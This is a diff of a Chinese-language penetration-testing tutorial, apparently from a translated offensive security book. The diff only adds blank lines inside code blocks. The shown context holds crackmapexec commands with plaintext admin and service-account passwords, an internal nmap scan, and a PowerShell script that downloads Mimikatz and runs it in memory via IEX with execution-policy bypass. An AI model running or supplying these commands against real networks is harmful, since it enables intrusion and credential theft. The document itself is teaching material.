@@ -52,6 +52,7 @@ Windows 定义了两类用户可以连接到域：
 在我们控制的任一台服务器上，运行一个简单的netstat命令来列出所有已建立的IP连接。
 
 ```text
+
 FrontGun$ proxychains crackmapexec -u Administrator - p M4ster_@dmin_123 -d WORKGROUP 192.168.1.70 - x "netstat -ano | findstr ESTABLISHED"
 ```
 
@@ -70,6 +71,7 @@ IP 10.10.20.118 显然不属于DMZ区。让我们试一试这个IP段。作为�
 首先，为缩小目标机的范围，我们启动nmap去扫描开放了445端口的目标主机。经验表明3389端口很有用是，所以也添加了进来。
 
 ```text
+
 FrontGun$ Proxychains nmap -n -p455,3389 10.10.20.0/24
 Starting Nmap 7.00 ( https://nmap.org ) at 2016-12-26 22:56 CET
     Nmap scan report for 10.10.20.27 
@@ -102,6 +104,7 @@ Starting Nmap 7.00 ( https://nmap.org ) at 2016-12-26 22:56 CET
 在我们拿到的所有帐户中，**svc\_mnt** 看起来最有希望。它看起来像是一个用于管理某种应用程序的服务帐户。因此，相比其他账户，它在其他服务器上被创建的可能性更高。我们使用该帐户启动 CME：
 
 ```text
+
 FrontGun$ proxychains crackmapexec -u svc_mnt -p Hello5\!981 -d WORKGROUP 10.10.20.27 10.10.20.90 10.10.20.97 10.10.20.118 10.10.20.210
 ```
 
@@ -122,6 +125,7 @@ UAC 是 Windows vista 中引入的一个功能，在执行特权操作\(软件�
 然后，我们编写一个小脚本，下载一个powershell版的Mimikatz，只在内存中通过IEX\(Invoke-Expression\)命令运行。
 
 ```text
+
 $browser = New-Object System.Net.WebClient
 
 $browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredential
@@ -134,6 +138,7 @@ Invoke-Mimikatz
 我们打开具有管理权限的命令提示符（右键单击&gt;以管理员身份运行），然后执行脚本:
 
 ```text
+
 10.10.20.118 > powershell -exec bypass .\letmein.ps1
 ```
 
